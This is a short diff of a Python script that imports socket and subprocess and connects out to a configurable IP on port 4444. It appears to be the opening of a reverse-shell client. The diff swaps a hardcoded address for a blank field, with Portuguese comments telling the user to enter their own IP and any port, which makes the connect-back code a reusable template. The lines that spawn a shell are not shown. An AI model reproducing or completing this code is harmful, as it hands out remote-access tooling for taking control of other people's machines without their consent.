@@ -1,8 +1,8 @@
 import socket
 import subprocess
 
-ip = "192.168.0.107"
-port = 4444
+ip = "" #seu endereço de ip
+port = 4444 #pode ser qualquer porta
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ip, port))
